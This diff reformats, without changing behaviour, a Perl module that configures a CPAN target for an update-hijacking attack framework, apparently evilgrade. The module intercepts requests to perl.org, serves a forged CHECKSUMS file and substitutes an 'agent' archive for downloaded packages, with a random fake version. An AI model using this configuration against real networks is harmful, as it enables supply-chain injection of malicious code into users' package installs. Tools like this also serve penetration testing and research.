@@ -27,53 +27,60 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'cpan',
-    'version' => '1.0',
-    'appver'  => '< 1.9402 (tested 19205 Slackware 13)',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com>' ],
-    'description' => qq{},    
-    'vh' => '(www.perl.org|cpan.localhost.net.ar)',
-    'request' => [
-		    {
-		    'req' => '/CHECKSUMS', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => '',
-		    'parse' => 1,
-		    'file' => './include/cpan/CHECKSUMS',
-		    },
-		    {
-		    'req' => '(.tar.gz|.gz|.zip)', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
-		    
+my $base = {
+    'name'        => 'cpan',
+    'version'     => '1.0',
+    'appver'      => '< 1.9402 (tested 19205 Slackware 13)',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobytesec.com>'],
+    'description' => qq{},
+    'vh'          => '(www.perl.org|cpan.localhost.net.ar)',
+    'request'     => [
+        {   'req'    => '/CHECKSUMS',               #regex friendly
+            'type'   => 'file',                     #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => 0,
+            'string' => '',
+            'parse'  => 1,
+            'file'   => './include/cpan/CHECKSUMS',
+        },
+        {   'req'    => '(.tar.gz|.gz|.zip)',       #regex friendly
+            'type'   => 'agent',                    #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
 
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent_perl.tar.gz', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-                    'version'  => { 'val' => '\'7.\'.isrcore::utils::RndNum(2)',
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-				},
-                    'module'  => { 'val' => 'join("",(split(/\//,$module->{\'Base\'}->{\'options\'}->{\'brequest\'}->{\'val\'}))[-1]) ',
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-				},				
-                    'rnd1'  => { 'val' => 'isrcore::utils::RndNum(5)',
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-                            }			    	  
-		 }
+
+    #Options
+    'options' => {
+        'agent' => {
+            'val'  => './agent/agent_perl.tar.gz',
+            'desc' => 'Agent to inject'
+        },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+        'version' => {
+            'val'     => '\'7.\'.isrcore::utils::RndNum(2)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+        'module' => {
+            'val' =>
+                'join("",(split(/\//,$module->{\'Base\'}->{\'options\'}->{\'brequest\'}->{\'val\'}))[-1]) ',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+        'rnd1' => {
+            'val'     => 'isrcore::utils::RndNum(5)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        }
+    }
 };
 
 ##########################################################################
@@ -86,5 +93,5 @@ sub new {
     my $class = shift;
     my $self = { 'Base' => $base, @_ };
     return bless $self, $class;
-}            
+}
 1;
